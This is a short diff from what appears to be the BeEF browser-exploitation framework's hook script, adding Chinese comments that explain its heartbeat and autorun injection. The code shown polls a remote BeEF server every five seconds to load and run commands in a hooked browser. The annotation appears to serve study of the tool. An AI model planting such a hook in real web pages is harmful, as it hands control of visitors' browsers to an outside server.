@@ -141,13 +141,13 @@ function include(script_filename) {
 	}
 }
 
-// start heartbeat
+// start heartbeat 开始心跳，5000毫秒去请求一次远程的js
 setInterval(function () {
 	var date = new Date().getTime();
 	include(beef_url + '/hook/command.php?BeEFSession=<?php echo session_id(); ?>&time=' + date);
 }, 5000);
 
-// run autorun module
+// run autorun module 默认的模块，注入一次
 // need setTimeout as the DOM element that is grabbed by include() function is not yet there
 // our injection may occur before the element is created within the DOM
 setTimeout(function () {
